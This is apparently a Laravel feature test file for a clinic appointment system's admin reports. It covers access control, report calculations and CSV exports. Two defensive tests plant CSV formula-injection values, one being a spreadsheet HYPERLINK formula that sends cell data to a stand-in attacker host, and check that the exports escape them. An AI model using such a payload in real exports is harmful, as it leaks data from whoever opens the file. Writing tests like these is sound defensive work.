<?php

namespace Tests\Feature;

use App\Models\Appointment;
use App\Models\DoctorAvailabilityTemplate;
use App\Models\Patient;
use App\Models\Queue;
use App\Models\Role;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\TestCase;

class ReportsTest extends TestCase
{
    use RefreshDatabase;

    public function test_non_administrator_roles_cannot_access_reports(): void
    {
        foreach (['Doctor', 'Nurse', 'Midwife', 'Data Encoder'] as $roleName) {
            $this->actingAs($this->userWithRole($roleName))
                ->get(route('admin.reports.index'))
                ->assertForbidden();
        }
    }

    public function test_appointment_volume_report_matches_known_fixture_data(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');

        Appointment::factory()->count(2)->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Completed']);
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'No Show']);
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Cancelled']);
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Pending']);

        // No-show rate = 1 / (2 completed + 1 no show) = 33.3%.
        $this->actingAs($admin)
            ->get(route('admin.reports.index', ['range' => 'today']))
            ->assertOk()
            ->assertSee('No-show rate: 33.3%');
    }

    public function test_doctor_utilization_report_computes_booked_capacity_and_percentage(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');
        $doctor->update(['name' => 'Dr. Utilization Test']);

        DoctorAvailabilityTemplate::create([
            'doctor_id' => $doctor->id,
            'day_of_week' => 1, // Monday
            'start_time' => '08:00:00',
            'end_time' => '10:00:00',
            'slot_duration_minutes' => 30,
            'is_active' => true,
        ]);

        $nextMonday = Carbon::now()->next(Carbon::MONDAY);

        // 4 total slots (08:00, 08:30, 09:00, 09:30); book 2 of them.
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => $nextMonday, 'appointment_time' => '08:00:00', 'status' => 'Approved']);
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => $nextMonday, 'appointment_time' => '08:30:00', 'status' => 'Pending']);

        $this->actingAs($admin)
            ->get(route('admin.reports.index', ['range' => 'custom', 'from' => $nextMonday->toDateString(), 'to' => $nextMonday->toDateString()]))
            ->assertOk()
            ->assertSeeInOrder(['Dr. Utilization Test', '2', '0', '4', '50%']);
    }

    public function test_patient_demographics_only_counts_patients_with_an_appointment_in_range(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');

        $inRange = Patient::factory()->create(['sex' => 'Female', 'barangay' => 'Poblacion']);
        $outOfRange = Patient::factory()->create(['sex' => 'Male', 'barangay' => 'Riverside']);

        Appointment::factory()->create(['patient_id' => $inRange->id, 'doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Approved']);
        Appointment::factory()->create(['patient_id' => $outOfRange->id, 'doctor_id' => $doctor->id, 'appointment_date' => today()->addDays(5), 'status' => 'Approved']);

        $this->actingAs($admin)
            ->get(route('admin.reports.index', ['range' => 'today']))
            ->assertOk()
            ->assertSee('1 patients seen in this range.')
            ->assertSee('Poblacion')
            ->assertDontSee('Riverside');
    }

    public function test_queue_turnaround_report_computes_expected_minutes(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');
        $appointment = Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Completed']);

        $queue = Queue::factory()->create([
            'appointment_id' => $appointment->id,
            'priority_type' => 'Regular',
            'queue_status' => 'Completed',
        ]);

        $checkedInAt = now()->subMinutes(45);
        DB::table('queues')->where('id', $queue->id)->update([
            'created_at' => $checkedInAt,
            'updated_at' => now(),
        ]);

        $this->actingAs($admin)
            ->get(route('admin.reports.index', ['range' => 'today']))
            ->assertOk()
            ->assertSeeInOrder(['Completed', '1', 'Avg (min)', '45']);
    }

    public function test_csv_exports_return_csv_with_header_and_data_rows(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');
        Appointment::factory()->create(['doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Completed']);

        $response = $this->actingAs($admin)->get(route('admin.reports.export.appointments', ['range' => 'today']));

        $response->assertOk();
        $this->assertStringContainsString('text/csv', $response->headers->get('Content-Type'));

        $content = $response->streamedContent();
        $this->assertStringContainsString('Date,Pending,Approved,Completed,Cancelled,"No Show",Total', $content);
        $this->assertStringContainsString(today()->toDateString(), $content);
    }

    public function test_doctor_utilization_csv_export_sanitizes_formula_injection_in_doctor_name(): void
    {
        $admin = $this->userWithRole('Administrator');
        // A doctor can set this via the ordinary Profile page — it must not
        // be trusted as safe CSV content.
        $this->userWithRole('Doctor', ['name' => '=1+1']);

        $response = $this->actingAs($admin)->get(route('admin.reports.export.doctors', ['range' => 'today']));

        $response->assertOk();
        $content = $response->streamedContent();

        $this->assertStringContainsString("'=1+1", $content);
        $this->assertStringNotContainsString("\n=1+1", $content);
        $this->assertStringNotContainsString(',=1+1', $content);
    }

    public function test_patient_demographics_csv_export_sanitizes_formula_injection_in_barangay(): void
    {
        $admin = $this->userWithRole('Administrator');
        $doctor = $this->userWithRole('Doctor');

        // A patient-creating role can set barangay freely — it must not be
        // trusted as safe CSV content either.
        $patient = Patient::factory()->create(['barangay' => '=HYPERLINK("http://attacker.example/leak?d="&A1,"x")']);
        Appointment::factory()->create(['patient_id' => $patient->id, 'doctor_id' => $doctor->id, 'appointment_date' => today(), 'status' => 'Approved']);

        $response = $this->actingAs($admin)->get(route('admin.reports.export.demographics', ['range' => 'today']));

        $response->assertOk();
        $content = $response->streamedContent();

        $this->assertStringContainsString('\'=HYPERLINK', $content);
        $this->assertStringNotContainsString(',=HYPERLINK', $content);
    }

    private function userWithRole(string $roleName, array $attributes = []): User
    {
        return User::factory()->create(array_merge([
            'role_id' => Role::firstOrCreate(['name' => $roleName])->id,
            'account_status' => 'ACTIVE',
        ], $attributes));
    }
}
